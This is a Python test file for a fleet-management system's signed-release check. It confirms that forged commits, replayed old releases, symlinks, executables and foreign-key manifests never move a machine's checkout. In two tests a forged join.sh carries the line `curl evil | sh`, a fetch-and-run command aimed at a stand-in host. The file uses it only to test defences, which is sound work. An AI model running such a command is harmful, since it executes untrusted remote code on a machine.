"""Signed code (DevOps plan v44, track 0, step 0.1): one check, `lifecycle.may_take`, stands before every move of a
Fleet checkout, so that one bug in the hub cannot put code on the configuration ref that the machines then run.

A checkout takes from the hub only data (the owner's files and a task's output, each a plain file) or a release that
a release key signed: the release's `release.json` on the ref, a revision that descends from the one the checkout
runs and from its user's floor, and that revision's own tree outside the data.

What it proves, for each mover of a checkout (the helper's update and task-start sync, the server service's update and
a new agent's first checkout, the hub's reload, write and rename, both installers, onboard.py, the owner's MCP server
and config-ref.sh): a forged commit and an old signed release move no checkout, and a real release does. The releases
are made by `releases.Update` itself, in temporary repositories; nothing here reaches a network or a real fleet, and
every test has its own HOME, so no floor of this computer's own is read or written.
"""
import atexit
import base64
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import patch

import fleet
import hub
import lifecycle
import onboard
import owner_mcp
import releases
import server
import vault
from test_hub_install import run_shell, shell_function
from test_ui_api import OwnerAPI
from test_vault import AGENT_KEY, OWNER, REF, STUDIO_KEY, VaultBroker, owner_pin

KIT = Path(__file__).resolve().parent
SEED = bytes(range(160, 192))           # this file's release key: the real one lives only on the website host
OTHER_SEED = bytes(range(192, 224))     # a key that is not the fleet's
KEY = releases.public_key(SEED)
OTHER_KEY = releases.public_key(OTHER_SEED)
CODE = ("lifecycle.py", "onboard.py", "releases.py")        # what `lifecycle.py may-take` runs with, from this checkout
TEAM = {"hub": {"machine": "hub", "port": 8765},
        "addresses": {"owner": "127.0.0.1", "hub": "127.0.0.2", "vps": "127.0.0.3"},
        "agents": {"manager": {"role": "manager", "runtime": "claude", "machine": "hub", "can": []},
                   "vps": {"role": "worker", "runtime": "codex", "machine": "vps", "can": ["shell"]}}}
PROFILE = "# Profile: vps\n\n**Character.** Careful.\n"


def load_tests(loader, _tests, _pattern):
    """Only the tests of this file: the hub fixture it borrows carries its own, and a mover's class takes the shared
    cases of Mover."""
    suite = unittest.TestSuite()
    for cls in (Check, Floor, Command, HelperUpdate, TaskStartSync, ServerUpdate, ServerNewCheckout, HubMovers,
                JoinScript, HubScript, Onboard, OwnerMCP, ConfigRef, HandoverRecipients):
        names = cls.__dict__ if issubclass(cls, OwnerAPI) else dir(cls)
        suite.addTests(cls(name) for name in names if name.startswith("test_"))
    return suite


def git(*args, cwd=None):
    done = subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "init.defaultBranch=main", *args],
                          cwd=cwd, capture_output=True, text=True, timeout=120)
    if done.returncode:
        raise AssertionError(f"git {' '.join(args)}: {done.stderr}")
    return done.stdout.strip()


def signed(revision, version, seed=SEED, hold=False):
    """A manifest of PRODUCT.md 4.3, signed as the website signs one."""
    body = {"revision": revision, "version": version, "notes": None, "minimum": None, "hold": hold}
    return dict(body, signature=base64.b64encode(releases.sign(seed, releases.signed_text(body))).decode())


def checks_pass(argv, timeout=None, cwd=None, input=None):
    """Git for real, and the release's own checks answered as passed: they take minutes and read the machine."""
    if argv[0] == "git":
        return releases._run(argv, timeout=timeout or releases.GIT_WAIT, cwd=cwd, input=input)
    if argv[-1].endswith("selftest.py"):
        return 0, "1 of 1 checks passed.", ""
    if argv[-2:] == ["verify", "--json"]:
        return 0, "[]", ""
    raise AssertionError("the update ran something unexpected: " + " ".join(argv))


def machine_run(argv, timeout=20, cwd=None):
    """A machine's commands: git for real, and nothing else of this computer."""
    if argv[0] == "git":
        return lifecycle._run(argv, timeout=timeout, cwd=cwd)
    return 1, "", "not in this test"


class Fleet:
    """A fleet in the shape it runs, in a temporary folder: the published repository (`upstream`), the hub's bare
    repository (`origin`) with its configuration ref, and the checkout that takes releases with `releases.Update`, as
    the hub's does. The ref starts as every fleet's did before track 0, with code and data and no release.json. The
    code is this checkout's own lifecycle.py, onboard.py and releases.py, so a shell mover runs the real check."""

    def __init__(self, root, team=None):
        self.root, self.made = Path(root), 0
        pub = self.root / "published"
        pub.mkdir(parents=True)
        for name in CODE:
            shutil.copy(KIT / name, pub / name)
        (pub / "hub.py").write_text("VERSION = 1\n")
        (pub / "join.sh").write_text("#!/bin/sh\n")
        (pub / lifecycle.RELEASE_KEYS).write_text(base64.b64encode(KEY).decode() + "\n")
        (pub / "team.json").write_text('{"agents": {}}\n')         # the published seed, which no fleet takes
        git("init", "-q", str(pub))
        git("add", "-A", cwd=pub)
        git("commit", "-q", "-m", "release 1", cwd=pub)
        self.pub, self.upstream = pub, str(self.root / "upstream.git")
        git("clone", "-q", "--bare", str(pub), self.upstream)
        seed = self.root / "seed"
        git("clone", "-q", self.upstream, str(seed))
        (seed / "team.json").write_text(json.dumps(team or TEAM, indent=2) + "\n")
        (seed / "profiles").mkdir()
        (seed / "profiles/vps.md").write_text(PROFILE)
        git("add", "-A", cwd=seed)
        git("commit", "-q", "-m", "the fleet's own", cwd=seed)
        git("branch", lifecycle.CONFIG_BRANCH, cwd=seed)
        self.origin = str(self.root / "origin.git")
        git("clone", "-q", "--bare", str(seed), self.origin)
        self.releaser = self.machine("releaser")

    def copy(self, root):
        """This fleet, whole, in another folder, with its repositories pointing at each other there: a test changes
        its own copy, and the releases of the first one are made once."""
        root = Path(root)
        shutil.copytree(self.root, root, symlinks=True)
        other = Fleet.__new__(Fleet)
        other.root, other.made = root, self.made
        other.pub, other.upstream, other.origin = root / "published", str(root / "upstream.git"), str(root / "origin.git")
        other.releaser = root / "releaser"
        for folder in root.iterdir():
            if (folder / ".git").is_dir():
                for name in git("remote", cwd=folder).split():
                    url = git("remote", "get-url", name, cwd=folder)
                    if url.startswith(str(self.root)):
                        git("remote", "set-url", name, str(root) + url[len(str(self.root)):], cwd=folder)
        return other

    def machine(self, name):
        """A checkout of the configuration ref, as a helper, a server or the hub has one."""
        folder = self.root / name
        git("clone", "-q", "-b", lifecycle.CONFIG_BRANCH, self.origin, str(folder))
        return folder

    def release(self, version, seed=SEED, keys=KEY):
        """Release `version` on the configuration ref, put there by releases.Update, as the hub takes one. `keys` are
        what the hub checks the channel's manifest with."""
        (self.pub / "hub.py").write_text(f"VERSION = {version}\n")
        git("commit", "-q", "-am", f"release {version}", cwd=self.pub)
        git("push", "-q", self.upstream, "HEAD:main", cwd=self.pub)
        revision = git("rev-parse", "HEAD", cwd=self.pub)
        git("fetch", "-q", "origin", cwd=self.releaser)
        git("merge", "-q", "--ff-only", "origin/" + lifecycle.CONFIG_BRANCH, cwd=self.releaser)
        answer = releases.Update(str(self.releaser), releases.check(signed(revision, f"2026.11.{version}", seed), keys),
                                 origin=self.origin, upstream=self.upstream, run=checks_pass).apply()
        assert answer["state"] == releases.DONE, answer["says"]
        return answer["reached"]

    def commit(self, write, message):
        """One commit on the configuration ref by something that is not a release: the hub, or a bug in it."""
        self.made += 1
        work = self.root / f"work-{self.made}"
        git("clone", "-q", "-b", lifecycle.CONFIG_BRANCH, self.origin, str(work))
        write(work)
        git("add", "-A", cwd=work)
        git("commit", "-q", "-m", message, cwd=work)
        git("push", "-q", "origin", "HEAD:" + lifecycle.CONFIG_BRANCH, cwd=work)
        return git("rev-parse", "HEAD", cwd=work)

    def forged(self, path="hub.py", text="VERSION = 'forged'\n"):
        return self.commit(lambda work: (work / path).write_text(text), "Forged: code with no release")

    def again(self, commit):
        """A new commit on the ref whose tree is an older release's commit, signed manifest and all."""
        return self.commit(lambda work: git("read-tree", "-u", "--reset", commit, cwd=work),
                           "Forged: an older release again")


def tip(fleet):
    return git("rev-parse", lifecycle.CONFIG_BRANCH, cwd=fleet.origin)


_MADE = {}


def fleet_at_three(root):
    """(a fleet that took releases 2 and 3 by releases.Update, release 2's commit, release 3's commit), in `root`. The
    fleet is made once in this process, and each test gets a copy of its own."""
    if not _MADE:
        base = Path(tempfile.mkdtemp(prefix="fleet-signed-made-"))
        atexit.register(shutil.rmtree, str(base), True)
        fleet = Fleet(base / "fleet")
        _MADE.update(fleet=fleet, two=fleet.release(2), three=fleet.release(3))
    return _MADE["fleet"].copy(root), _MADE["two"], _MADE["three"]


class Repositories(unittest.TestCase):
    """A fleet that took releases 2 and 3 by releases.Update, and one machine's checkout at release 3."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="fleet-signed-"))
        self.addCleanup(shutil.rmtree, str(self.tmp), True)
        self.fleet, self.two, self.three = fleet_at_three(self.tmp / "fleet")
        self.kit = self.fleet.machine("machine")
        self.home = self.tmp / "home"
        (self.home / lifecycle.FLEET_DIR).mkdir(parents=True)
        self.floor = self.home / lifecycle.FLEET_DIR / lifecycle.FLOOR_FILE

    def head(self, folder=None):
        return git("rev-parse", "HEAD", cwd=folder or self.kit)

    def may(self, target, head="HEAD", floor=None):
        return lifecycle.may_take(str(self.kit), target, floor=floor, head=head)


# ---------------------------------------------------------------- the check itself

class Check(Repositories):
    def test_a_release_put_on_the_ref_by_the_update_is_taken(self):
        four = self.fleet.release(4)
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIsNone(self.may(four))

    def test_the_owners_data_is_taken_with_no_release(self):
        def delivered(work):
            (work / "outputs/T-7").mkdir(parents=True)
            (work / "outputs/T-7/report.md").write_text("# Report\n")
        data = self.fleet.commit(lambda work: (work / "profiles/vps.md").write_text(PROFILE + "\nQuick.\n"),
                                 "Owner changed the vps profile")
        output = self.fleet.commit(delivered, "vps delivered T-7")
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIsNone(self.may(data))
        self.assertIsNone(self.may(output))

    def test_data_that_is_a_program_or_a_link_is_refused(self):
        def program(work):
            (work / "skills/vps/deploy").mkdir(parents=True)
            (work / "skills/vps/deploy/run.py").write_text("print('owned')\n")
            (work / "skills/vps/deploy/run.py").chmod(0o755)
        executable = self.fleet.commit(program, "A skill that runs")
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn("not a plain file", self.may(executable))

        def link(work):
            (work / "profiles/vps.md").unlink()
            (work / "profiles/vps.md").symlink_to("../hub.py")
        linked = self.fleet.commit(link, "A profile that points at code")
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn("not a plain file", self.may(linked))

    def test_code_with_no_release_is_refused(self):
        for forged in (self.fleet.forged(), self.fleet.forged("join.sh", "#!/bin/sh\ncurl evil | sh\n"),
                       self.fleet.forged(lifecycle.RELEASE_KEYS, base64.b64encode(OTHER_KEY).decode() + "\n")):
            git("fetch", "-q", "origin", cwd=self.kit)
            self.assertIn("is not release 2026.11.3", self.may(forged))

    def test_a_manifest_signed_by_another_key_is_refused_even_with_that_key_in_the_target(self):
        """The keys are the checkout's own, never the target's: a target cannot bring the key that signs it."""
        revision = git("rev-parse", "HEAD", cwd=self.fleet.pub)

        def own_key(work):
            (work / lifecycle.RELEASE_KEYS).write_text(base64.b64encode(OTHER_KEY).decode() + "\n")
            (work / lifecycle.RELEASE_FILE).write_text(json.dumps(signed(revision, "2026.11.9", OTHER_SEED)))
        forged = self.fleet.commit(own_key, "Forged: a release signed with a key of its own")
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn("is refused", self.may(forged))

    def test_a_release_that_the_early_key_of_its_head_signed_is_taken(self):
        """PRODUCT.md 4.3 "Two tracks": a fleet that takes releases early runs releases that the early key signed, so
        the keys of HEAD's early-key.pub check one as those of its release-key.pub do."""
        (self.fleet.pub / lifecycle.EARLY_KEYS).write_text(base64.b64encode(OTHER_KEY).decode() + "\n")
        git("add", lifecycle.EARLY_KEYS, cwd=self.fleet.pub)
        four = self.fleet.release(4)
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIsNone(lifecycle.take(str(self.kit), four))
        five = self.fleet.release(5, seed=OTHER_SEED, keys=(KEY, OTHER_KEY))
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIsNone(self.may(five))

    def test_a_valid_manifest_over_a_tree_that_is_not_its_revision_is_refused(self):
        def tamper(work):
            (work / "hub.py").write_text("VERSION = 'forged under a real signature'\n")
        forged = self.fleet.commit(tamper, "Forged: code under the signed manifest of release 3")
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn("differs in hub.py", self.may(forged))

    def test_an_older_release_is_refused(self):
        old = self.fleet.again(self.two)
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn("does not descend from the release this checkout runs", self.may(old))

    def test_a_held_release_is_refused(self):
        revision = git("rev-parse", "HEAD", cwd=self.fleet.pub)
        held = self.fleet.commit(lambda work: (work / lifecycle.RELEASE_FILE).write_text(
            json.dumps(signed(revision, "2026.11.3", hold=True))), "A held release")
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn("is held", self.may(held))

    def test_a_checkout_with_no_release_takes_one_that_comes_after_the_floor(self):
        """The cut-over: a checkout from before track 0 has no release.json, and takes the first signed release while
        its user has no floor. **On a machine whose checkouts share one user, another checkout of that user may have
        written the floor first**: the one with no release then takes a release at or after the floor, never one
        under it. It took none at all, and stayed where it was for every release after (3 November 2026)."""
        before = git("rev-parse", f"{self.two}^1", cwd=self.kit)           # the ref before release 2
        self.assertIsNone(lifecycle._blob(str(self.kit), None, before, lifecycle.RELEASE_FILE))
        self.assertIsNone(self.may(self.three, head=before))
        self.floor.write_text(json.dumps({"revision": git("rev-parse", "HEAD", cwd=self.fleet.pub)}) + "\n")
        self.assertIsNone(self.may(self.three, head=before, floor=str(self.floor)))
        four = self.fleet.release(4)
        git("fetch", "-q", "origin", cwd=self.kit)
        newer = json.loads(git("show", f"{four}:{lifecycle.RELEASE_FILE}", cwd=self.kit))["revision"]
        self.floor.write_text(json.dumps({"revision": newer}) + "\n")
        self.assertIn("newest release this user took", self.may(self.three, head=before, floor=str(self.floor)))
        self.assertIsNone(self.may(four, head=before, floor=str(self.floor)))


class Floor(Repositories):
    def test_two_checkouts_that_raise_the_floor_at_once_never_lower_it(self):
        """The checkouts of one OS user move at the same time, in processes of their own. One that read the floor
        before another raised it to a newer release must not then write its older one over it: the read, the check
        and the write hold one lock of the floor's own. Here the slower process runs release 2, and waits inside its
        check until this one, at release 3, has written (or one second, when the lock keeps this one out)."""
        floor, inside, written = str(self.floor), self.tmp / "inside", self.tmp / "written"
        self.floor.write_text(json.dumps({"revision": "0" * 40, "version": "1"}) + "\n")
        newer = [["0" * 40, "2" * 40], ["0" * 40, "3" * 40], ["2" * 40, "3" * 40]]
        stand_in = """
import json, os, sys, time
sys.path.insert(0, sys.argv[1])
import lifecycle
kit, floor, revision, inside, written, newer = sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], \\
    [tuple(pair) for pair in json.loads(sys.argv[7])]
def run(argv, timeout=None, **_kw):
    words = argv[3:]                    # git -C <kit> ...
    if words[:2] == ["cat-file", "-e"]:
        return 0, "", ""
    if words[:2] == ["cat-file", "blob"]:
        return 0, json.dumps({"revision": revision, "version": revision[0]}), ""
    if words[:2] == ["merge-base", "--is-ancestor"]:
        if inside != "-":
            open(inside, "w").close()
            until = time.monotonic() + 1
            while not os.path.exists(written) and time.monotonic() < until:
                time.sleep(0.02)
        return (0 if (words[2], words[3]) in newer else 1), "", ""
    raise AssertionError(argv)
lifecycle.keep_floor(kit, floor, run)
"""

        def checkout(revision, wait):
            return subprocess.Popen([sys.executable, "-c", stand_in, str(KIT), str(self.kit), floor, revision,
                                     str(inside) if wait else "-", str(written), json.dumps(newer)],
                                    env=dict(os.environ, HOME=str(self.home)))
        slower = checkout("2" * 40, True)
        for _ in range(500):
            if inside.exists() or slower.poll() is not None:
                break
            time.sleep(0.02)
        self.assertTrue(inside.exists())
        self.assertEqual(checkout("3" * 40, False).wait(20), 0)
        written.write_text("")
        self.assertEqual(slower.wait(20), 0)
        self.assertEqual(lifecycle.read_floor(floor), ("3" * 40, None))

    def test_the_floor_follows_the_release_a_checkout_runs_and_never_goes_down(self):
        lifecycle.keep_floor(str(self.kit), str(self.floor))
        released = json.loads((self.kit / lifecycle.RELEASE_FILE).read_text())["revision"]
        self.assertEqual(lifecycle.read_floor(str(self.floor)), (released, None))
        lifecycle.keep_floor(str(self.kit), str(self.floor), head=self.two)        # an older release: kept as it is
        self.assertEqual(lifecycle.read_floor(str(self.floor)), (released, None))

    def test_a_release_under_the_floor_is_refused_even_from_a_checkout_that_is_behind(self):
        four = self.fleet.release(4)
        git("fetch", "-q", "origin", cwd=self.kit)
        newer = json.loads(git("show", f"{four}:{lifecycle.RELEASE_FILE}", cwd=self.kit))["revision"]
        self.floor.write_text(json.dumps({"revision": newer}) + "\n")
        old = self.fleet.again(self.three)
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn("newest release this user took", self.may(old, head=self.two, floor=str(self.floor)))

    def test_a_floor_that_cannot_be_read_stops_every_code_move_and_says_where_it_is(self):
        self.floor.write_text("not a floor\n")
        four = self.fleet.release(4)
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertIn(str(self.floor), self.may(four, floor=str(self.floor)))


class Command(Repositories):
    """`python3 lifecycle.py may-take KIT TARGET`, the form the shell movers run."""

    def run_it(self, target):
        return subprocess.run(["python3", str(self.kit / "lifecycle.py"), "may-take", str(self.kit), target],
                              capture_output=True, text=True, env=dict(os.environ, HOME=str(self.home)), timeout=120)

    def test_it_answers_with_its_status_and_keeps_the_floor_of_its_user(self):
        forged = self.fleet.forged()
        git("fetch", "-q", "origin", cwd=self.kit)
        done = self.run_it(forged)
        self.assertEqual(done.returncode, 1)
        self.assertIn("lifecycle.py may-take: ", done.stderr)
        released = json.loads((self.kit / lifecycle.RELEASE_FILE).read_text())["revision"]
        self.assertEqual(lifecycle.read_floor(str(self.floor)), (released, None))
        four = self.fleet.release(4)
        git("fetch", "-q", "origin", cwd=self.kit)
        self.assertEqual(self.run_it(four).returncode, 0)


class TakeOnce(Repositories):
    """take() reads its target once, as one commit: a fetch that moves the ref between the check and the merge (the
    task-start sync and the update of one helper run in two threads) brings nothing unchecked."""

    def test_a_ref_that_moves_after_the_check_is_not_what_is_taken(self):
        four = self.fleet.release(4)
        git("fetch", "-q", "origin", cwd=self.kit)
        check = lifecycle.may_take

        def checked_then_moved(*args, **kwargs):
            said = check(*args, **kwargs)
            self.fleet.forged()                         # the ref moves on to a forged commit, and a fetch brings it in
            git("fetch", "-q", "origin", cwd=self.kit)
            return said
        with patch.object(lifecycle, "may_take", side_effect=checked_then_moved):
            self.assertIsNone(lifecycle.take(str(self.kit), "origin/" + lifecycle.CONFIG_BRANCH, floor=str(self.floor)))
        self.assertEqual(self.head(), four)


# ---------------------------------------------------------------- every mover

class Mover(Repositories):
    """The task's line, for one mover: a forged commit and an old signed release move no checkout, and a real
    release does. A class of a mover says how that mover moves the checkout (`move`)."""

    def moved(self):
        return self.head()

    def test_a_forged_commit_moves_no_checkout(self):
        self.move(self.fleet.forged())
        self.assertEqual(self.moved(), self.three)

    def test_an_old_signed_release_moves_no_checkout(self):
        self.move(self.fleet.again(self.two))
        self.assertEqual(self.moved(), self.three)

    def test_a_real_release_moves_the_checkout(self):
        four = self.fleet.release(4)
        self.move(four)
        self.assertEqual(self.moved(), four)


class HelperUpdate(Mover):
    """fleet.py's helper takes the hub's revision when it is idle (Lifecycle.apply)."""
    def move(self, target):
        life = lifecycle.Lifecycle(str(self.kit), "vps", {"role": "worker", "runtime": "codex"}, None, lambda: False,
                                   restart=lambda: True, run=machine_run, home=str(self.home), floor=str(self.floor))
        life.report = lambda *a, **k: None
        self.restarted = life.apply(target)

    def test_a_refused_move_is_a_failed_update_and_no_restart(self):
        self.move(self.fleet.forged())
        self.assertFalse(self.restarted)


class TaskStartSync(Mover):
    """The helper brings the checkout up to date before a task session (lifecycle.follow_config_ref)."""
    def move(self, target):
        self.said = lifecycle.follow_config_ref(str(self.kit), floor=str(self.floor))


class ServerUpdate(Mover):
    """The server service takes the hub's revision when it has no job (server.Service.update)."""
    def move(self, target):
        service = server.Service({"name": "worker-9", "repo": self.fleet.origin}, None, kit=str(self.kit),
                                 home=str(self.home), floor=str(self.floor))
        service.restart = lambda: None
        service.desired = target
        service.update()


class ServerNewCheckout(Mover):
    """A new agent's checkout starts at the server's own checked revision (DevOps plan 0.2) and then follows the ref
    under the check (server.Service.checkout_step)."""
    def move(self, target):
        service = server.Service({"name": "worker-9", "repo": self.fleet.origin}, None, kit=str(self.kit),
                                 home=str(self.home), floor=str(self.floor))
        service.post = lambda *a, **k: None
        try:
            service.checkout_step({"id": 1}, "vps")
        except server.StepFailed:
            pass                        # a refused move fails the step, and the checkout stays where it started

    def moved(self):
        return self.head(self.home / "fleet-vps")


class HubMovers(OwnerAPI):
    """The hub's own checkout moves in three places besides a release: an owner write (commit_kit_file), a reload
    (reload_team) and the end of a server's rename (finish_machine_rename)."""

    def setUp(self):
        super().setUp()
        self.root = Path(tempfile.mkdtemp(prefix="fleet-signed-hub-"))
        self.addCleanup(shutil.rmtree, str(self.root), True)
        self.fleet, self.two, self.three = fleet_at_three(self.root / "fleet")
        self.kit = self.fleet.machine("hub")
        hub.TEAM = json.loads(json.dumps(TEAM))
        hub.CFG["team_path"] = str(self.kit / "team.json")
        hub.CFG["release_floor"] = str(self.root / "floor")
        hub._revision_cache.update(at=0.0, value=None)
        hub._code_diffs.clear()

    def tearDown(self):
        for key in ("team_path", "release_floor"):
            hub.CFG.pop(key, None)
        hub._revision_cache.update(at=0.0, value=None)
        hub._code_diffs.clear()
        super().tearDown()

    def head(self):
        return git("rev-parse", "HEAD", cwd=self.kit)

    def team_bytes(self, **change):
        team = json.loads(json.dumps(TEAM))
        team["agents"]["vps"].update(change)
        return (json.dumps(team, indent=2) + "\n").encode()

    # ---- reload_team

    def test_a_reload_onto_a_forged_commit_or_an_old_release_is_refused(self):
        for target in (self.fleet.forged(), self.fleet.again(self.two)):
            with self.assertRaises(hub.Refusal) as caught:
                hub.reload_team(target)
            self.assertEqual(caught.exception.status, 409)
            self.assertEqual(self.head(), self.three)

    def test_a_reload_onto_a_real_release_moves_the_hub(self):
        four = self.fleet.release(4)
        self.assertEqual(hub.reload_team(four)["revision"], four)
        self.assertEqual(self.head(), four)

    # ---- commit_kit_file

    def test_an_owner_write_does_not_take_in_a_forged_commit_or_an_old_release(self):
        """A commit of the ref that changes no Python file passed `same_code`, so before the check the hub took a
        forged key file or an older release.json in with the owner's next write."""
        key = self.fleet.forged(lifecycle.RELEASE_KEYS, base64.b64encode(OTHER_KEY).decode() + "\n")
        with self.assertRaises(hub.Refusal) as caught:
            hub.commit_kit_file("team.json", self.team_bytes(can=["shell", "web"]), "Owner changed vps")
        self.assertEqual(caught.exception.status, 409)
        self.assertEqual(self.head(), self.three)
        self.assertEqual(tip(self.fleet), key)                  # and nothing of the owner's write was pushed over it

    def test_an_owner_write_moves_the_hub_as_data(self):
        commit = hub.commit_kit_file("team.json", self.team_bytes(can=["shell", "web"]), "Owner changed vps")
        self.assertEqual(self.head(), commit)
        self.assertIsNone(lifecycle.may_take(str(self.kit), commit, head=self.three))

    def test_an_owner_write_after_an_older_release_json_is_refused(self):
        older = git("show", f"{self.two}:{lifecycle.RELEASE_FILE}", cwd=self.kit)
        self.fleet.commit(lambda work: (work / lifecycle.RELEASE_FILE).write_text(older + "\n"),
                          "Forged: the manifest of an older release")
        with self.assertRaises(hub.Refusal):
            hub.commit_kit_file("team.json", self.team_bytes(can=["shell", "web"]), "Owner changed vps")
        self.assertEqual(self.head(), self.three)

    # ---- finish_machine_rename

    def renamed(self, more=None):
        """origin's team.json with the server vps renamed worker-9, and anything else of `more`, in one commit."""
        def write(work):
            team = json.loads(json.dumps(TEAM))
            team["addresses"]["worker-9"] = team["addresses"].pop("vps")
            team["agents"]["vps"]["machine"] = "worker-9"
            (work / "team.json").write_text(json.dumps(team, indent=2) + "\n")
            if more:
                more(work)
        commit = self.fleet.commit(write, "Server vps is now worker-9, its name in Tailscale")
        hub.kv_set("machine_rename", json.dumps(["vps", "worker-9"]))
        hub.MACHINE_NAMES["origin_at"] = 0.0
        with hub.LOCK:
            hub.finish_machine_rename(hub.now())
        return commit

    def test_a_rename_finished_over_a_forged_commit_moves_nothing(self):
        """join.sh is no Python file, so the rename's own guard (fleet_code) let it through before the check."""
        self.renamed(lambda work: (work / "join.sh").write_text("#!/bin/sh\ncurl evil | sh\n"))
        self.assertEqual(self.head(), self.three)
        self.assertIsNotNone(hub.kv_get("machine_rename"))          # the note waits for a commit the hub may take

    def test_a_rename_finished_over_an_old_release_moves_nothing(self):
        older = git("show", f"{self.two}:{lifecycle.RELEASE_FILE}", cwd=self.kit)
        self.renamed(lambda work: (work / lifecycle.RELEASE_FILE).write_text(older + "\n"))
        self.assertEqual(self.head(), self.three)
        self.assertIsNotNone(hub.kv_get("machine_rename"))

    def test_a_rename_of_data_alone_is_finished(self):
        commit = self.renamed()
        self.assertEqual(self.head(), commit)
        self.assertIsNone(hub.kv_get("machine_rename"))


class Shell(Mover):
    """A mover written in shell runs `lifecycle.py may-take` of its own checkout, as this machine's user."""

    def shell(self, text):
        done = subprocess.run(["sh", "-c", text], capture_output=True, text=True, timeout=120,
                              env=dict(os.environ, HOME=str(self.home)), stdin=subprocess.DEVNULL)
        self.said = done.stdout + done.stderr
        return done.returncode


class JoinScript(Shell):
    """join.sh brings a server's checkout up to date after the join (`current`) and on a second run (`checkout`)."""
    def move(self, target):
        script = KIT / "join.sh"
        code, self.said = run_shell(shell_function(script, "take") + shell_function(script, "current")
                                    + f"current {self.kit} as_self\n",
                                    extra=f"HOME={self.home}\nexport HOME\nas_self() {{ \"$@\"; }}\n")
        self.assertEqual(code, 0, self.said)

    def test_a_refusal_says_why_and_the_join_goes_on(self):
        self.move(self.fleet.forged())
        self.assertIn("may-take", self.said)
        self.assertIn("could not take the hub's newest commit; it stays as it is", self.said)


class HubScript(Shell):
    """hub.sh brings each agent's checkout on the hub machine up to date when it runs again."""
    def move(self, target):
        code, self.said = run_shell(shell_function(KIT / "hub.sh", "take")
                                    + f"take {self.kit} as_self || say could not update\n",
                                    extra=f"HOME={self.home}\nexport HOME\nas_self() {{ \"$@\"; }}\n")
        self.assertEqual(code, 0, self.said)


class Onboard(Shell):
    """onboard.py moves a worker's checkout over SSH with onboard.TAKE, in that checkout."""
    def move(self, target):
        self.shell(f"cd {self.kit} && {onboard.TAKE}")


class OwnerMCP(Shell):
    """The owner's MCP server moves the code on a server it installs with owner_mcp.take_line."""
    def move(self, target):
        self.shell(owner_mcp.take_line(str(self.kit)))


class ConfigRef(Shell):
    """config-ref.sh puts a checkout on the configuration ref and up to date with it."""
    def move(self, target):
        self.shell(f"sh {KIT / 'config-ref.sh'} {self.kit}")




# ---------------------------------------------------------------- a handover's recipient (DevOps plan 0.3)

class HandoverRecipients(VaultBroker):
    """A broker hands a login over only to a key that the owner signed a pin for: the hub carries the owner's pin of
    the receiving machine beside the job, and the broker checks it with the owner's keys of its own configuration.
    A hub that is broken into names the receiving key, and cannot sign for the owner."""

    def refused(self, says):
        with self.assertRaises(fleet.Refused) as caught:
            fleet.vault_call({"op": "handover", "job": self.job()})
        self.assertIn(says, str(caught.exception))
        self.assertEqual(self.reads(), [])                      # the login was never opened

    def test_a_pinned_recipient_gets_its_copy(self):
        raw = fleet.vault_call({"op": "handover", "job": self.job()})
        self.assertEqual((raw["to"], self.opens(raw["ciphertext"], "studio")["password"]),
                         ("studio", "FakeOnlyPassword-987654321"))

    def broken_in_hub(self):
        """The hub's own rule taken away, as a hub that is broken into would: it names the key of team.json, pinned or
        not. The broker's check is then the only one that is left."""
        return patch.object(hub, "handover_key", lambda name: (hub.agents().get(name) or {}).get("vault_recipient"))

    def test_a_key_the_hub_names_in_place_of_the_pinned_one_is_refused(self):
        hub.TEAM["agents"]["studio"]["vault_recipient"] = AGENT_KEY         # a forged team.json
        self.refused("has no vault broker with a pinned handover key")    # the hub's own rule refuses it first
        self.assertIsNone(hub.handover_key("studio"))
        with self.broken_in_hub():
            self.refused("the owner's pin names another key")

    def test_a_machine_with_no_pin_of_the_owner_gets_nothing(self):
        hub.kv_set("owner_pin:studio", None)
        self.refused("has no vault broker with a pinned handover key")
        with self.broken_in_hub():
            self.refused("the owner has signed no pin")

    def test_hand_over_says_why_nothing_can_be_locked_for_the_receiver(self):
        """One sentence for each reason of the hub's own rule (hub.handover_unpinned), and a damaged kept row is no pin
        and stops nothing."""
        def says():
            with self.assertRaises(hub.ToolError) as caught:
                hub.t_hand_over("vps", {"task_id": f"T-{self.task}", "login": REF, "to": "studio"})
            return str(caught.exception)
        hub.kv_set("owner_pin:studio", None)
        self.assertIn("The owner has not pinned the vault key of", says())
        hub.kv_set("owner_pin:studio", "not json at all")
        self.assertIn("The owner has not pinned the vault key of", says())
        hub.kv_set("owner_pin:studio", json.dumps(owner_pin("studio", AGENT_KEY)))
        self.assertIn("names another key than its vault's", says())
        hub.kv_set("owner_pin:studio", None)
        machine = hub.TEAM["agents"]["studio"]["machine"]
        with patch.object(hub, "deposit_machines", return_value={machine: {"carrier": "studio"}}):
            self.assertIn("The owner's Founderizer app pins it by itself.", says())
        with patch.object(hub, "deposit_machines", return_value={machine: {"carrier": None}}):   # no delivery can go there
            self.assertIn("once that server's vault can take deliveries, and it cannot now", says())
        with patch.object(hub, "deposit_machines", return_value={}):         # a machine with no worker or lead
            self.assertIn("pins only the servers that have a worker or a lead", says())
        hub.kv_set("owner_pin:studio", json.dumps(owner_pin("studio", STUDIO_KEY)))
        hub.TEAM["agents"]["studio"].pop("vault_recipient")
        self.assertIn("has no key with the hub yet", says())

    def test_a_pin_that_another_key_signed_is_refused(self):
        stranger = owner_pin("studio", STUDIO_KEY, d=12345678901234567890)
        hub.kv_set("owner_pin:studio", json.dumps(stranger))
        self.refused("does not carry a valid signature of the owner")

    def test_a_pin_of_another_fleet_is_refused(self):
        hub.kv_set("owner_pin:studio", json.dumps(owner_pin("studio", STUDIO_KEY, fleet_id="fedcba9876543210")))
        self.refused("the statement is for another fleet")
